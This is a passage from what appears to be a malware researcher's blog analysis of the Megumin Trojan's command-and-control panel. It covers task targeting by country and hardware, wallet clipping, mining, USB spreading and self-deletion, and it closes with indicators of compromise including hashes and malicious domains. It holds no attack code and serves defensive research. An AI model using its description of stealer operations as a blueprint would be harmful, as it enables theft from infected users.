data-orig-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2019/05/megumin_dashboard_04.png?fit=1133%2C381&amp;ssl=1" data-orig-size="1133,381" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="megumin_dashboard_04" data-image-description="" data-image-caption="" data-medium-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2019/05/megumin_dashboard_04.png?fit=300%2C101&amp;ssl=1" data-large-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2019/05/megumin_dashboard_04.png?fit=900%2C302&amp;ssl=1" class="alignnone size-full wp-image-705" src="https://i0.wp.com/fumik0.com/wp-content/uploads/2019/05/megumin_dashboard_04.png?resize=900%2C303&#038;ssl=1" alt="megumin_dashboard_04" width="900" height="303" srcset="https://i0.wp.com/fumik0.com/wp-content/uploads/2019/05/megumin_dashboard_04.png?w=1133&amp;ssl=1 1133w, https://i0.wp.com/fumik0.com/wp-content/uploads/2019/05/megumin_dashboard_04.png?resize=300%2C101&amp;ssl=1 300w, https://i0.wp.com/fumik0.com/wp-content/uploads/2019/05/megumin_dashboard_04.png?resize=768%2C258&amp;ssl=1 768w, https://i0.wp.com/fumik0.com/wp-content/uploads/2019/05/megumin_dashboard_04.png?resize=1024%2C344&amp;ssl=1 1024w" sizes="auto, (max-width: 900px) 100vw, 900px" /></p>
<h3>Bots</h3>
<ul>
<li>Bots &#8211; Current list of bots</li>
<li>Tasks &#8211; Task creation &amp; current task list</li>
<li>Files &#8211; All files that have been uploaded to the C&amp;C with the help of the task &#8220;upload&#8221;</li>
</ul>
<p><img data-recalc-dims="1" loading="lazy" decoding="async" data-attachment-id="703" data-permalink="https://fumik0.com/2019/05/03/lets-nuke-megumin-trojan/megumin_panel_bots/" data-orig-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2019/05/megumin_panel_bots.png?fit=1143%2C754&amp;ssl=1" data-orig-size="1143,754" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="megumin_panel_bots" data-image-description="" data-image-caption="" data-medium-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2019/05/megumin_panel_bots.png?fit=300%2C198&amp;ssl=1" data-large-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2019/05/megumin_panel_bots.png?fit=900%2C593&amp;ssl=1" class="alignnone size-full wp-image-703" src="https://i0.wp.com/fumik0.com/wp-content/uploads/2019/05/megumin_panel_bots.png?resize=900%2C594&#038;ssl=1" alt="megumin_panel_bots" width="900" height="594" srcset="https://i0.wp.com/fumik0.com/wp-content/uploads/2019/05/megumin_panel_bots.png?w=1143&amp;ssl=1 1143w, https://i0.wp.com/fumik0.com/wp-content/uploads/2019/05/megumin_panel_bots.png?resize=300%2C198&amp;ssl=1 300w, https://i0.wp.com/fumik0.com/wp-content/uploads/2019/05/megumin_panel_bots.png?resize=768%2C507&amp;ssl=1 768w, https://i0.wp.com/fumik0.com/wp-content/uploads/2019/05/megumin_panel_bots.png?resize=1024%2C675&amp;ssl=1 1024w" sizes="auto, (max-width: 900px) 100vw, 900px" /></p>
<h3>Task setup</h3>
<p>Tasks that I&#8217;ve detailed above are representing like this on the C&amp;C, as usual, it&#8217;s designed to be user-friendly for customers, they just want to configure fast and easily their stuff to be able to steal &amp; being profitable quickly as possible.</p>
<p><img data-recalc-dims="1" loading="lazy" decoding="async" data-attachment-id="670" data-permalink="https://fumik0.com/2019/05/03/lets-nuke-megumin-trojan/megumin_bots_tasks_step1/" data-orig-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2019/04/megumin_bots_tasks_step1.png?fit=521%2C480&amp;ssl=1" data-orig-size="521,480" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="megumin_bots_tasks_step1" data-image-description="" data-image-caption="" data-medium-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2019/04/megumin_bots_tasks_step1.png?fit=300%2C276&amp;ssl=1" data-large-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2019/04/megumin_bots_tasks_step1.png?fit=521%2C480&amp;ssl=1" class="alignnone size-full wp-image-670" src="https://i0.wp.com/fumik0.com/wp-content/uploads/2019/04/megumin_bots_tasks_step1.png?resize=521%2C480&#038;ssl=1" alt="megumin_bots_tasks_step1" width="521" height="480" srcset="https://i0.wp.com/fumik0.com/wp-content/uploads/2019/04/megumin_bots_tasks_step1.png?w=521&amp;ssl=1 521w, https://i0.wp.com/fumik0.com/wp-content/uploads/2019/04/megumin_bots_tasks_step1.png?resize=300%2C276&amp;ssl=1 300w" sizes="auto, (max-width: 521px) 100vw, 521px" /></p>
<p>When selected, there is a usual configuration setup for the task, with classy fields like :</p>
<ul>
<li>Task Name</li>
<li>Max Executions routine</li>
<li>If the Task must be designed for targeting only one bot</li>
<li>And an interesting advanced setting tab</li>
</ul>
<p><img data-recalc-dims="1" loading="lazy" decoding="async" data-attachment-id="671" data-permalink="https://fumik0.com/2019/05/03/lets-nuke-megumin-trojan/megumin_bots_tasks_step2/" data-orig-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2019/04/megumin_bots_tasks_step2.png?fit=513%2C618&amp;ssl=1" data-orig-size="513,618" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="megumin_bots_tasks_step2" data-image-description="" data-image-caption="" data-medium-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2019/04/megumin_bots_tasks_step2.png?fit=249%2C300&amp;ssl=1" data-large-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2019/04/megumin_bots_tasks_step2.png?fit=513%2C618&amp;ssl=1" class="alignnone size-full wp-image-671" src="https://i0.wp.com/fumik0.com/wp-content/uploads/2019/04/megumin_bots_tasks_step2.png?resize=513%2C618&#038;ssl=1" alt="megumin_bots_tasks_step2" width="513" height="618" srcset="https://i0.wp.com/fumik0.com/wp-content/uploads/2019/04/megumin_bots_tasks_step2.png?w=513&amp;ssl=1 513w, https://i0.wp.com/fumik0.com/wp-content/uploads/2019/04/megumin_bots_tasks_step2.png?resize=249%2C300&amp;ssl=1 249w" sizes="auto, (max-width: 513px) 100vw, 513px" /></p>
<p>If we look at it, the advanced setting is where the C&amp;C could targeting bots by :</p>
<ul>
<li>Specific hardware requirements</li>
<li>Platform</li>
<li>Countries</li>
</ul>
<p>Countries can be easily catchable on the Victim machine by checking the Locale of the Keyboard (I have already explained this tick on <a href="https://fumik0.com/2018/12/24/lets-dig-into-vidar-an-arkei-copycat-forked-stealer-in-depth-analysis/">Vidar</a>) and the IP.</p>
<p><img data-recalc-dims="1" loading="lazy" decoding="async" data-attachment-id="672" data-permalink="https://fumik0.com/2019/05/03/lets-nuke-megumin-trojan/megumin_bots_tasks_step2_adv/" data-orig-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2019/04/megumin_bots_tasks_step2_adv.png?fit=463%2C535&amp;ssl=1" data-orig-size="463,535" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="megumin_bots_tasks_step2_adv" data-image-description="" data-image-caption="" data-medium-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2019/04/megumin_bots_tasks_step2_adv.png?fit=260%2C300&amp;ssl=1" data-large-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2019/04/megumin_bots_tasks_step2_adv.png?fit=463%2C535&amp;ssl=1" class="alignnone size-full wp-image-672" src="https://i0.wp.com/fumik0.com/wp-content/uploads/2019/04/megumin_bots_tasks_step2_adv.png?resize=463%2C535&#038;ssl=1" alt="megumin_bots_tasks_step2_adv" width="463" height="535" srcset="https://i0.wp.com/fumik0.com/wp-content/uploads/2019/04/megumin_bots_tasks_step2_adv.png?w=463&amp;ssl=1 463w, https://i0.wp.com/fumik0.com/wp-content/uploads/2019/04/megumin_bots_tasks_step2_adv.png?resize=260%2C300&amp;ssl=1 260w" sizes="auto, (max-width: 463px) 100vw, 463px" /></p>
<p>So it means that malware could be designed to target highly specific areas.</p>
<p>When the task is completed, its represented like this.</p>
<p><img data-recalc-dims="1" loading="lazy" decoding="async" data-attachment-id="710" data-permalink="https://fumik0.com/2019/05/03/lets-nuke-megumin-trojan/megumin_task_cc-2/" data-orig-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2019/05/megumin_task_cc-1.png?fit=1116%2C440&amp;ssl=1" data-orig-size="1116,440" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="megumin_task_cc" data-image-description="" data-image-caption="" data-medium-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2019/05/megumin_task_cc-1.png?fit=300%2C118&amp;ssl=1" data-large-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2019/05/megumin_task_cc-1.png?fit=900%2C355&amp;ssl=1" class="alignnone size-full wp-image-710" src="https://i0.wp.com/fumik0.com/wp-content/uploads/2019/05/megumin_task_cc-1.png?resize=900%2C355&#038;ssl=1" alt="megumin_task_cc" width="900" height="355" srcset="https://i0.wp.com/fumik0.com/wp-content/uploads/2019/05/megumin_task_cc-1.png?w=1116&amp;ssl=1 1116w, https://i0.wp.com/fumik0.com/wp-content/uploads/2019/05/megumin_task_cc-1.png?resize=300%2C118&amp;ssl=1 300w, https://i0.wp.com/fumik0.com/wp-content/uploads/2019/05/megumin_task_cc-1.png?resize=768%2C303&amp;ssl=1 768w, https://i0.wp.com/fumik0.com/wp-content/uploads/2019/05/megumin_task_cc-1.png?resize=1024%2C404&amp;ssl=1 1024w" sizes="auto, (max-width: 900px) 100vw, 900px" /></p>
<p>&nbsp;</p>
<h3>Clips</h3>
<p><img data-recalc-dims="1" loading="lazy" decoding="async" data-attachment-id="704" data-permalink="https://fumik0.com/2019/05/03/lets-nuke-megumin-trojan/megumin_panel_clips/" data-orig-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2019/05/megumin_panel_clips.png?fit=1143%2C592&amp;ssl=1" data-orig-size="1143,592" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="megumin_panel_clips" data-image-description="" data-image-caption="" data-medium-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2019/05/megumin_panel_clips.png?fit=300%2C155&amp;ssl=1" data-large-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2019/05/megumin_panel_clips.png?fit=900%2C466&amp;ssl=1" class="alignnone size-full wp-image-704" src="https://i0.wp.com/fumik0.com/wp-content/uploads/2019/05/megumin_panel_clips.png?resize=900%2C466&#038;ssl=1" alt="megumin_panel_clips" width="900" height="466" srcset="https://i0.wp.com/fumik0.com/wp-content/uploads/2019/05/megumin_panel_clips.png?w=1143&amp;ssl=1 1143w, https://i0.wp.com/fumik0.com/wp-content/uploads/2019/05/megumin_panel_clips.png?resize=300%2C155&amp;ssl=1 300w, https://i0.wp.com/fumik0.com/wp-content/uploads/2019/05/megumin_panel_clips.png?resize=768%2C398&amp;ssl=1 768w, https://i0.wp.com/fumik0.com/wp-content/uploads/2019/05/megumin_panel_clips.png?resize=1024%2C530&amp;ssl=1 1024w" sizes="auto, (max-width: 900px) 100vw, 900px" /></p>
<h3>Settings</h3>
<h4>Bots</h4>
<p><img data-recalc-dims="1" loading="lazy" decoding="async" data-attachment-id="663" data-permalink="https://fumik0.com/2019/05/03/lets-nuke-megumin-trojan/megumin_settings_bots/" data-orig-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2019/04/megumin_settings_bots.png?fit=1152%2C502&amp;ssl=1" data-orig-size="1152,502" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="megumin_settings_bots" data-image-description="" data-image-caption="" data-medium-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2019/04/megumin_settings_bots.png?fit=300%2C131&amp;ssl=1" data-large-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2019/04/megumin_settings_bots.png?fit=900%2C392&amp;ssl=1" class="alignnone size-full wp-image-663" src="https://i0.wp.com/fumik0.com/wp-content/uploads/2019/04/megumin_settings_bots.png?resize=900%2C392&#038;ssl=1" alt="megumin_settings_bots" width="900" height="392" srcset="https://i0.wp.com/fumik0.com/wp-content/uploads/2019/04/megumin_settings_bots.png?w=1152&amp;ssl=1 1152w, https://i0.wp.com/fumik0.com/wp-content/uploads/2019/04/megumin_settings_bots.png?resize=300%2C131&amp;ssl=1 300w, https://i0.wp.com/fumik0.com/wp-content/uploads/2019/04/megumin_settings_bots.png?resize=768%2C335&amp;ssl=1 768w, https://i0.wp.com/fumik0.com/wp-content/uploads/2019/04/megumin_settings_bots.png?resize=1024%2C446&amp;ssl=1 1024w" sizes="auto, (max-width: 900px) 100vw, 900px" /></p>
<ul>
<li>&#8220;USB Spreading&#8221; remains to /isUSB API request</li>
<li>&#8220;Del exe after start&#8221; remains to /selfDel API request</li>
</ul>
<h4>Clipper</h4>
<p>Clipper is quite simple, it&#8217;s just the configuration of all wallet that will be clipped.</p>
<p><img data-recalc-dims="1" loading="lazy" decoding="async" data-attachment-id="664" data-permalink="https://fumik0.com/2019/05/03/lets-nuke-megumin-trojan/megumin_settings_clipper/" data-orig-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2019/04/megumin_settings_clipper.png?fit=1153%2C459&amp;ssl=1" data-orig-size="1153,459" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="megumin_settings_clipper" data-image-description="" data-image-caption="" data-medium-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2019/04/megumin_settings_clipper.png?fit=300%2C119&amp;ssl=1" data-large-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2019/04/megumin_settings_clipper.png?fit=900%2C359&amp;ssl=1" class="alignnone size-full wp-image-664" src="https://i0.wp.com/fumik0.com/wp-content/uploads/2019/04/megumin_settings_clipper.png?resize=900%2C358&#038;ssl=1" alt="megumin_settings_clipper" width="900" height="358" srcset="https://i0.wp.com/fumik0.com/wp-content/uploads/2019/04/megumin_settings_clipper.png?w=1153&amp;ssl=1 1153w, https://i0.wp.com/fumik0.com/wp-content/uploads/2019/04/megumin_settings_clipper.png?resize=300%2C119&amp;ssl=1 300w, https://i0.wp.com/fumik0.com/wp-content/uploads/2019/04/megumin_settings_clipper.png?resize=768%2C306&amp;ssl=1 768w, https://i0.wp.com/fumik0.com/wp-content/uploads/2019/04/megumin_settings_clipper.png?resize=1024%2C408&amp;ssl=1 1024w" sizes="auto, (max-width: 900px) 100vw, 900px" /></p>
<h4>Miner</h4>
<p>The miner tab is quite classy also, just a basic configuration of the config and where it will download the payload.</p>
<p><img data-recalc-dims="1" loading="lazy" decoding="async" data-attachment-id="665" data-permalink="https://fumik0.com/2019/05/03/lets-nuke-megumin-trojan/megumin_settings_miner/" data-orig-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2019/04/megumin_settings_miner.png?fit=1142%2C689&amp;ssl=1" data-orig-size="1142,689" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="megumin_settings_miner" data-image-description="" data-image-caption="" data-medium-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2019/04/megumin_settings_miner.png?fit=300%2C181&amp;ssl=1" data-large-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2019/04/megumin_settings_miner.png?fit=900%2C543&amp;ssl=1" class="alignnone size-full wp-image-665" src="https://i0.wp.com/fumik0.com/wp-content/uploads/2019/04/megumin_settings_miner.png?resize=900%2C543&#038;ssl=1" alt="megumin_settings_miner" width="900" height="543" srcset="https://i0.wp.com/fumik0.com/wp-content/uploads/2019/04/megumin_settings_miner.png?w=1142&amp;ssl=1 1142w, https://i0.wp.com/fumik0.com/wp-content/uploads/2019/04/megumin_settings_miner.png?resize=300%2C181&amp;ssl=1 300w, https://i0.wp.com/fumik0.com/wp-content/uploads/2019/04/megumin_settings_miner.png?resize=768%2C463&amp;ssl=1 768w, https://i0.wp.com/fumik0.com/wp-content/uploads/2019/04/megumin_settings_miner.png?resize=1024%2C618&amp;ssl=1 1024w" sizes="auto, (max-width: 900px) 100vw, 900px" /></p>
<p>As usual, the process blacklist will remain the same as we saw in other miner malware. Some google search will be sufficient to know which processes are the most targeted.</p>
<h4>MessageBox</h4>
<p>A fancy message box configuration part with multiple possibilities.</p>
<p><img data-recalc-dims="1" loading="lazy" decoding="async" data-attachment-id="668" data-permalink="https://fumik0.com/2019/05/03/lets-nuke-megumin-trojan/megumin_settings_msbox/" data-orig-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2019/04/megumin_settings_msbox.png?fit=1144%2C446&amp;ssl=1" data-orig-size="1144,446" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="megumin_settings_msbox" data-image-description="" data-image-caption="" data-medium-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2019/04/megumin_settings_msbox.png?fit=300%2C117&amp;ssl=1" data-large-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2019/04/megumin_settings_msbox.png?fit=900%2C351&amp;ssl=1" class="alignnone size-full wp-image-668" src="https://i0.wp.com/fumik0.com/wp-content/uploads/2019/04/megumin_settings_msbox.png?resize=900%2C351&#038;ssl=1" alt="megumin_settings_msbox" width="900" height="351" srcset="https://i0.wp.com/fumik0.com/wp-content/uploads/2019/04/megumin_settings_msbox.png?w=1144&amp;ssl=1 1144w, https://i0.wp.com/fumik0.com/wp-content/uploads/2019/04/megumin_settings_msbox.png?resize=300%2C117&amp;ssl=1 300w, https://i0.wp.com/fumik0.com/wp-content/uploads/2019/04/megumin_settings_msbox.png?resize=768%2C299&amp;ssl=1 768w, https://i0.wp.com/fumik0.com/wp-content/uploads/2019/04/megumin_settings_msbox.png?resize=1024%2C399&amp;ssl=1 1024w" sizes="auto, (max-width: 900px) 100vw, 900px" /></p>
<h4>Countries</h4>
<p>It&#8217;s also possible to ban bots from specific countries, on the side bot side, the malware will check if the country is valid or not with the help of the IP and the Keyboard Language configuration.</p>
<p><img data-recalc-dims="1" loading="lazy" decoding="async" data-attachment-id="666" data-permalink="https://fumik0.com/2019/05/03/lets-nuke-megumin-trojan/megumin_settings_countries/" data-orig-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2019/04/megumin_settings_countries.png?fit=1143%2C240&amp;ssl=1" data-orig-size="1143,240" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="megumin_settings_countries" data-image-description="" data-image-caption="" data-medium-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2019/04/megumin_settings_countries.png?fit=300%2C63&amp;ssl=1" data-large-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2019/04/megumin_settings_countries.png?fit=900%2C189&amp;ssl=1" class="alignnone size-full wp-image-666" src="https://i0.wp.com/fumik0.com/wp-content/uploads/2019/04/megumin_settings_countries.png?resize=900%2C189&#038;ssl=1" alt="megumin_settings_countries" width="900" height="189" srcset="https://i0.wp.com/fumik0.com/wp-content/uploads/2019/04/megumin_settings_countries.png?w=1143&amp;ssl=1 1143w, https://i0.wp.com/fumik0.com/wp-content/uploads/2019/04/megumin_settings_countries.png?resize=300%2C63&amp;ssl=1 300w, https://i0.wp.com/fumik0.com/wp-content/uploads/2019/04/megumin_settings_countries.png?resize=768%2C161&amp;ssl=1 768w, https://i0.wp.com/fumik0.com/wp-content/uploads/2019/04/megumin_settings_countries.png?resize=1024%2C215&amp;ssl=1 1024w" sizes="auto, (max-width: 900px) 100vw, 900px" /></p>
<p>On the code, it&#8217;s easily traceable by these checks, for more explanation about how it works for the keyboard part, this is already detailed on the Vidar paper.</p>
<h4>Panel</h4>
<p>For some reasons, there is also a possibility to change the username for the panel authentication, by doing this the 2FA Google Authenticator is required for confirming this.</p>
<p><img data-recalc-dims="1" loading="lazy" decoding="async" data-attachment-id="667" data-permalink="https://fumik0.com/2019/05/03/lets-nuke-megumin-trojan/megumin_settings_panel/" data-orig-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2019/04/megumin_settings_panel.png?fit=1132%2C230&amp;ssl=1" data-orig-size="1132,230" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="megumin_settings_panel" data-image-description="" data-image-caption="" data-medium-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2019/04/megumin_settings_panel.png?fit=300%2C61&amp;ssl=1" data-large-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2019/04/megumin_settings_panel.png?fit=900%2C183&amp;ssl=1" class="alignnone size-full wp-image-667" src="https://i0.wp.com/fumik0.com/wp-content/uploads/2019/04/megumin_settings_panel.png?resize=900%2C183&#038;ssl=1" alt="megumin_settings_panel" width="900" height="183" srcset="https://i0.wp.com/fumik0.com/wp-content/uploads/2019/04/megumin_settings_panel.png?w=1132&amp;ssl=1 1132w, https://i0.wp.com/fumik0.com/wp-content/uploads/2019/04/megumin_settings_panel.png?resize=300%2C61&amp;ssl=1 300w, https://i0.wp.com/fumik0.com/wp-content/uploads/2019/04/megumin_settings_panel.png?resize=768%2C156&amp;ssl=1 768w, https://i0.wp.com/fumik0.com/wp-content/uploads/2019/04/megumin_settings_panel.png?resize=1024%2C208&amp;ssl=1 1024w" sizes="auto, (max-width: 900px) 100vw, 900px" /></p>
<h2>Script</h2>
<p>For further investigation about this v2, I developed a small script called &#8220;ohana&#8221;, like the Vidar one to extract the configuration of each sample and it&#8217;s already available on <a href="https://github.com/Fmk0/scripts/blob/master/ohana.py">my GitHub repository</a>.</p>
<p><img data-recalc-dims="1" loading="lazy" decoding="async" data-attachment-id="701" data-permalink="https://fumik0.com/2019/05/03/lets-nuke-megumin-trojan/megumin_script/" data-orig-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2019/05/megumin_script.png?fit=642%2C210&amp;ssl=1" data-orig-size="642,210" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="megumin_script" data-image-description="" data-image-caption="" data-medium-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2019/05/megumin_script.png?fit=300%2C98&amp;ssl=1" data-large-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2019/05/megumin_script.png?fit=642%2C210&amp;ssl=1" class="alignnone size-full wp-image-701" src="https://i0.wp.com/fumik0.com/wp-content/uploads/2019/05/megumin_script.png?resize=642%2C210&#038;ssl=1" alt="megumin_script" width="642" height="210" srcset="https://i0.wp.com/fumik0.com/wp-content/uploads/2019/05/megumin_script.png?w=642&amp;ssl=1 642w, https://i0.wp.com/fumik0.com/wp-content/uploads/2019/05/megumin_script.png?resize=300%2C98&amp;ssl=1 300w" sizes="auto, (max-width: 642px) 100vw, 642px" /></p>
<h2>IoCs</h2>
<p>Hashes</p>
<ul>
<li>d15e1bc9096810fb4c954e5487d5a54f8c743cfd36ed0639a0b4cb044e04339f</li>
<li>e6c447c826ae810dec6059c797aa04474dd27f84e37e61b650158449b5229469</li>
<li>c70120ee9dd25640049fa2d08a76165948491e4cf236ec5ff204e927a0b14918</li>
<li>d431e6f0d3851bbc5a956c5ca98ae43c3a99109b5832b5ac458b8def984357b8</li>
<li>ed65610f2685f2b8c765ee2968c37dfce286ddcc31029ee6091c89505f341b97</li>
<li>89813ebf2da34d52c1b924b408d0b46d1188b38f035d22fab26b852ad6a6fc19</li>
<li>8777749af37a2fd290aad42eb87110d1ab7ccff4baa88bd130442f25578f3fe1</li>
</ul>
<p>Domains</p>
<ul>
<li>90551.prohoster.biz</li>
<li>baldorclip.icu</li>
<li>santaluisa.top</li>
<li>megumin.top</li>
<li>megumin.world</li>
</ul>
<p>PDB</p>
<ul>
<li>C:\Users\Ddani\source\repos\MeguminV2\Release\MeguminV2.pdb</li>
